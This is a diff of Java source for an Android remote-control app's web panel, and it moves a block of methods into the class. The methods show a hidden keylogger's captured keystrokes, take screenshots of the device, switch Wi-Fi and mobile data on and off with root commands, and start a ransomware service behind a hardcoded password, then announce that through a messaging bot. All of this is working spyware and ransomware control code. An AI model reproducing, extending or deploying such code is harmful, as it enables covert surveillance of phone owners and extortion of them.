@@ -1950,87 +1950,91 @@ private Response serveCameraPhoto(Map<String, String> params) {
         return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
     }
 }
-// ============ Advanced Page Functions ============
+// ============ Advanced Page Functions ===========
 
-private Response serveAdvancedPage() {
-    String keylogContent = readKeylogFile();
-    String html = HTML_HEADER +
-        "<div class=\"card\"><h2>⚙️ Advanced Controls</h2></div>" +
-        "<div class=\"card\"><h3>📸 Screenshot</h3><a href=\"/screenshot\" class=\"btn btn-primary\" target=\"_blank\">Take Screenshot</a></div>" +
-        "<div class=\"card\"><h3>⌨️ Keylogger</h3><textarea rows=\"8\" style=\"width:100%\" readonly>" + escapeHtml(keylogContent) + "</textarea>" +
-        "<a href=\"/keylog\" class=\"btn btn-success\">Refresh</a> <button onclick=\"clearKeylog()\" class=\"btn btn-warning\">Clear</button></div>" +
-        "<div class=\"card\"><h3>🌐 Network</h3>" +
-        "<a href=\"/wifi/on\" class=\"btn btn-success\">WiFi ON</a> <a href=\"/wifi/off\" class=\"btn btn-danger\">WiFi OFF</a> " +
-        "<a href=\"/data/on\" class=\"btn btn-success\">Data ON</a> <a href=\"/data/off\" class=\"btn btn-danger\">Data OFF</a></div>" +
-        "<div class=\"card\"><h3>⚠️ Ransomware</h3><input type=\"password\" id=\"rp\" placeholder=\"Password\">" +
-        "<button onclick=\"fetch('/ransom/activate?pass='+document.getElementById('rp').value).then(r=>r.json()).then(d=>alert(d.message))\" class=\"btn btn-danger\">Activate</button></div>" +
-        "<script>function clearKeylog(){fetch('/keylog?clear=true').then(()=>location.reload());}</script>" + HTML_FOOTER;
-    return newFixedLengthResponse(Response.Status.OK, "text/html", html);
-}
+    // ============ Advanced Page Functions (توابع جدید داخل کلاس) ============
 
-private String readKeylogFile() {
-    try {
-        File f = new File(context.getFilesDir(), ".system_keylog.txt");
-        if (f.exists()) {
-            FileInputStream fis = new FileInputStream(f);
-            byte[] d = new byte[(int) f.length()];
-            fis.read(d);
-            fis.close();
-            return new String(d);
+    private Response serveAdvancedPage() {
+        String keylogContent = readKeylogFile();
+        String html = HTML_HEADER +
+            "<div class=\"card\"><h2>⚙️ Advanced Controls</h2></div>" +
+            "<div class=\"card\"><h3>📸 Screenshot</h3><a href=\"/screenshot\" class=\"btn btn-primary\" target=\"_blank\">Take Screenshot</a></div>" +
+            "<div class=\"card\"><h3>⌨️ Keylogger</h3><textarea rows=\"8\" style=\"width:100%\" readonly>" + escapeHtml(keylogContent) + "</textarea>" +
+            "<a href=\"/keylog\" class=\"btn btn-success\">Refresh</a> <button onclick=\"clearKeylog()\" class=\"btn btn-warning\">Clear</button></div>" +
+            "<div class=\"card\"><h3>🌐 Network</h3>" +
+            "<a href=\"/wifi/on\" class=\"btn btn-success\">WiFi ON</a> <a href=\"/wifi/off\" class=\"btn btn-danger\">WiFi OFF</a> " +
+            "<a href=\"/data/on\" class=\"btn btn-success\">Data ON</a> <a href=\"/data/off\" class=\"btn btn-danger\">Data OFF</a></div>" +
+            "<div class=\"card\"><h3>⚠️ Ransomware</h3><input type=\"password\" id=\"rp\" placeholder=\"Password\">" +
+            "<button onclick=\"fetch('/ransom/activate?pass='+document.getElementById('rp').value).then(r=>r.json()).then(d=>alert(d.message))\" class=\"btn btn-danger\">Activate</button></div>" +
+            "<script>function clearKeylog(){fetch('/keylog?clear=true').then(()=>location.reload());}</script>" + HTML_FOOTER;
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private String readKeylogFile() {
+        try {
+            File f = new File(context.getFilesDir(), ".system_keylog.txt");
+            if (f.exists()) {
+                FileInputStream fis = new FileInputStream(f);
+                byte[] d = new byte[(int) f.length()];
+                fis.read(d);
+                fis.close();
+                return new String(d);
+            }
+        } catch(Exception e){}
+        return "No keystrokes yet.";
+    }
+
+    private Response getKeylog(Map<String,String> p){
+        if(p.containsKey("clear")) new File(context.getFilesDir(), ".system_keylog.txt").delete();
+        return serveAdvancedPage();
+    }
+
+    private Response takeScreenshot(){
+        try{
+            Runtime.getRuntime().exec("screencap -p /sdcard/s.png").waitFor();
+            File f = new File("/sdcard/s.png");
+            if(f.exists()){
+                FileInputStream fis = new FileInputStream(f);
+                byte[] d = new byte[(int)f.length()];
+                fis.read(d);
+                fis.close();
+                String b64 = Base64.encodeToString(d, Base64.DEFAULT);
+                f.delete();
+                String html = HTML_HEADER + "<div class=\"card\"><img src=\"data:image/png;base64,"+b64+"\" style=\"max-width:100%\"><br><a href=\"/advanced\" class=\"btn\">Back</a></div>" + HTML_FOOTER;
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+            }
+        } catch(Exception e){}
+        return serveError("Screenshot failed");
+    }
+
+    private Response setWifi(boolean e){
+        try{
+            ((WifiManager)context.getSystemService(Context.WIFI_SERVICE)).setWifiEnabled(e);
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+        } catch(Exception ex){
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false}");
         }
-    } catch(Exception e){}
-    return "No keystrokes yet.";
-}
+    }
 
-private Response getKeylog(Map<String,String> p){
-    if(p.containsKey("clear")) new File(context.getFilesDir(), ".system_keylog.txt").delete();
-    return serveAdvancedPage();
-}
-
-private Response takeScreenshot(){
-    try{
-        Runtime.getRuntime().exec("screencap -p /sdcard/s.png").waitFor();
-        File f = new File("/sdcard/s.png");
-        if(f.exists()){
-            FileInputStream fis = new FileInputStream(f);
-            byte[] d = new byte[(int)f.length()];
-            fis.read(d);
-            fis.close();
-            String b64 = Base64.encodeToString(d, Base64.DEFAULT);
-            f.delete();
-            String html = HTML_HEADER + "<div class=\"card\"><img src=\"data:image/png;base64,"+b64+"\" style=\"max-width:100%\"><br><a href=\"/advanced\" class=\"btn\">Back</a></div>" + HTML_FOOTER;
-            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    private Response setMobileData(boolean e){
+        try{
+            Process p = Runtime.getRuntime().exec("su");
+            java.io.DataOutputStream os = new java.io.DataOutputStream(p.getOutputStream());
+            os.writeBytes("svc data "+(e?"enable":"disable")+"\n");
+            os.flush(); os.close(); p.waitFor();
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
+        } catch(Exception ex){
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Root required\"}");
         }
-    } catch(Exception e){}
-    return serveError("Screenshot failed");
-}
-
-private Response setWifi(boolean e){
-    try{
-        ((WifiManager)context.getSystemService(Context.WIFI_SERVICE)).setWifiEnabled(e);
-        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
-    } catch(Exception ex){
-        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false}");
     }
-}
 
-private Response setMobileData(boolean e){
-    try{
-        Process p = Runtime.getRuntime().exec("su");
-        java.io.DataOutputStream os = new java.io.DataOutputStream(p.getOutputStream());
-        os.writeBytes("svc data "+(e?"enable":"disable")+"\n");
-        os.flush(); os.close(); p.waitFor();
-        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true}");
-    } catch(Exception ex){
-        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Root required\"}");
+    private Response activateRansomware(Map<String,String> p){
+        if("admin123".equals(p.get("pass"))){
+            startService(new Intent(context, RansomwareService.class));
+            HttpServerService.sendToRubikaBot("⚠️ RANSOMWARE ACTIVATED");
+            return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true,\"message\":\"Ransomware activated\"}");
+        }
+        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Wrong password\"}");
     }
-}
 
-private Response activateRansomware(Map<String,String> p){
-    if("admin123".equals(p.get("pass"))){
-        startService(new Intent(context, RansomwareService.class));
-        HttpServerService.sendToRubikaBot("⚠️ RANSOMWARE ACTIVATED");
-        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":true,\"message\":\"Ransomware activated\"}");
-    }
-    return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\":false,\"message\":\"Wrong password\"}");
-}
+}  // ← این } آخر کلاس است (فقط یک بار)
